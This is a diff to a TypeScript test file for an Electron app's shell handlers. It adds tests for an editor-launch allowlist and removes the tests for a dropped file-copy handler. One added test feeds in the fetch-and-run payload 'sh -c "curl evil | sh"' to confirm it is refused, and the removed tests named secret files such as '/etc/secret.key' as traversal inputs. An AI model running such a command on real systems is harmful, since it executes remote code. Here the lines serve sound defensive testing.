@@ -3,22 +3,18 @@ import { normalize, resolve } from 'node:path'
 import { pathToFileURL } from 'node:url'
 
 const {
-  copyFileMock,
   getSpawnArgsForWindowsMock,
   handleMock,
   openPathMock,
-  realpathMock,
   resolveCliCommandMock,
   showItemInFolderMock,
   showOpenDialogMock,
   spawnMock,
   statMock
 } = vi.hoisted(() => ({
-  copyFileMock: vi.fn(),
   getSpawnArgsForWindowsMock: vi.fn(),
   handleMock: vi.fn(),
   openPathMock: vi.fn(),
-  realpathMock: vi.fn(),
   resolveCliCommandMock: vi.fn(),
   showItemInFolderMock: vi.fn(),
   showOpenDialogMock: vi.fn(),
@@ -41,10 +37,6 @@ vi.mock('electron', () => ({
 }))
 
 vi.mock('node:fs/promises', () => ({
-  constants: { COPYFILE_EXCL: 1 },
-  copyFile: copyFileMock,
-  // Why: filesystem-auth canonicalizes via realpath; identity keeps test paths stable.
-  realpath: realpathMock,
   stat: statMock
 }))
 
@@ -68,12 +60,20 @@ import { resolveExternalEditorLaunchSpec } from '../external-editor-launch'
 // data must use resolved paths to avoid Unix-vs-Windows mismatches.
 const REPO_PATH = resolve('/workspace/repo')
 const WORKSPACE_DIR = resolve('/workspace')
+const NVIM_WINDOWS_PATH = 'C:\\Program Files\\Neovim\\bin\\nvim.exe'
 
 const store = {
   getRepos: () => [
     { id: 'repo-1', path: REPO_PATH, displayName: 'repo', badgeColor: '#000', addedAt: 0 }
   ],
-  getSettings: () => ({ workspaceDir: WORKSPACE_DIR })
+  getSettings: () => ({
+    workspaceDir: WORKSPACE_DIR,
+    // Why: these mirror user-configured "Open in" editors so command-allowlist tests exercise trusted launchers.
+    openInApplications: [
+      { id: 'typora', label: 'Typora', command: 'open -a "Typora"' },
+      { id: 'nvim', label: 'Neovim', command: NVIM_WINDOWS_PATH }
+    ]
+  })
 }
 
 function createSpawnedProcess(result: 'spawn' | 'error' = 'spawn'): {
@@ -98,18 +98,14 @@ function createSpawnedProcess(result: 'spawn' | 'error' = 'spawn'): {
 
 describe('registerShellHandlers', () => {
   beforeEach(() => {
-    copyFileMock.mockReset()
     handleMock.mockReset()
     getSpawnArgsForWindowsMock.mockReset()
     openPathMock.mockReset()
-    realpathMock.mockReset()
     resolveCliCommandMock.mockReset()
     showItemInFolderMock.mockReset()
     showOpenDialogMock.mockReset()
     spawnMock.mockReset()
     statMock.mockReset()
-    copyFileMock.mockResolvedValue(undefined)
-    realpathMock.mockImplementation(async (p: string) => p)
     openPathMock.mockResolvedValue('')
     resolveCliCommandMock.mockReturnValue('editor-cli')
     getSpawnArgsForWindowsMock.mockImplementation((command: string, args: string[]) => ({
@@ -365,7 +361,7 @@ describe('registerShellHandlers', () => {
       Object.defineProperty(process, 'platform', { configurable: true, value: 'win32' })
       const workspacePath = resolve('workspace')
       const handler = getHandler('shell:openInExternalEditor')
-      const nvimPath = 'C:\\Program Files\\Neovim\\bin\\nvim.exe'
+      const nvimPath = NVIM_WINDOWS_PATH
 
       try {
         await expect(handler({}, workspacePath, nvimPath)).resolves.toEqual({ ok: true })
@@ -451,6 +447,28 @@ describe('registerShellHandlers', () => {
         windowsHide: true
       })
     })
+
+    it('refuses an untrusted command not in settings or the built-in set', async () => {
+      const workspacePath = resolve('workspace')
+      const handler = getHandler('shell:openInExternalEditor')
+
+      // Why: a compromised renderer must not turn this into arbitrary process execution via `sh -c`.
+      await expect(handler({}, workspacePath, 'sh -c "curl evil | sh"')).resolves.toEqual({
+        ok: false,
+        reason: 'launch-failed'
+      })
+      expect(spawnMock).not.toHaveBeenCalled()
+      expect(statMock).not.toHaveBeenCalled()
+    })
+
+    it('allows a command configured in openInApplications settings', async () => {
+      const filePath = normalize(resolve('note.md'))
+      const handler = getHandler('shell:openInExternalEditor')
+
+      // 'open -a "Typora"' is the configured store double entry.
+      await expect(handler({}, filePath, 'open -a "Typora"')).resolves.toEqual({ ok: true })
+      expect(spawnMock).toHaveBeenCalled()
+    })
   })
 
   describe('legacy file open handlers', () => {
@@ -519,58 +537,9 @@ describe('registerShellHandlers', () => {
     })
   })
 
-  describe('shell:copyFile', () => {
-    it('rejects relative paths', async () => {
-      const handler = getHandler('shell:copyFile')
-
-      await expect(
-        handler({}, { srcPath: 'relative/image.png', destPath: `${REPO_PATH}/notes/image.png` })
-      ).rejects.toThrow('Both source and destination must be absolute paths')
-      expect(copyFileMock).not.toHaveBeenCalled()
-    })
-
-    it('rejects a source outside allowed roots', async () => {
-      const handler = getHandler('shell:copyFile')
-
-      await expect(
-        handler(
-          {},
-          { srcPath: resolve('/etc/secret.key'), destPath: `${REPO_PATH}/notes/secret.key` }
-        )
-      ).rejects.toThrow('Access denied')
-      expect(copyFileMock).not.toHaveBeenCalled()
-    })
-
-    it('rejects a destination outside allowed roots', async () => {
-      const handler = getHandler('shell:copyFile')
-
-      await expect(
-        handler({}, { srcPath: `${REPO_PATH}/notes/image.png`, destPath: resolve('/etc/leak.png') })
-      ).rejects.toThrow('Access denied')
-      expect(copyFileMock).not.toHaveBeenCalled()
-    })
-
-    it('rejects a source symlink that escapes allowed roots', async () => {
-      const srcPath = resolve(`${REPO_PATH}/notes/link.png`)
-      realpathMock.mockImplementation(async (p: string) =>
-        p === srcPath ? resolve('/private/secret.png') : p
-      )
-      const handler = getHandler('shell:copyFile')
-
-      await expect(
-        handler({}, { srcPath, destPath: `${REPO_PATH}/notes/copy.png` })
-      ).rejects.toThrow('Access denied')
-      expect(copyFileMock).not.toHaveBeenCalled()
-    })
-
-    it('copies between authorized worktree paths without overwriting', async () => {
-      const srcPath = resolve(`${REPO_PATH}/screenshots/shot.png`)
-      const destPath = resolve(`${REPO_PATH}/notes/shot.png`)
-      const handler = getHandler('shell:copyFile')
-
-      await expect(handler({}, { srcPath, destPath })).resolves.toBeUndefined()
-      // Why: COPYFILE_EXCL is mocked as 1; the flag must survive the auth rewrite.
-      expect(copyFileMock).toHaveBeenCalledWith(srcPath, destPath, 1)
-    })
+  it('does not register the removed shell:copyFile handler', () => {
+    registerShellHandlers(store as never)
+    const registered = handleMock.mock.calls.some((c: unknown[]) => c[0] === 'shell:copyFile')
+    expect(registered).toBe(false)
   })
 })
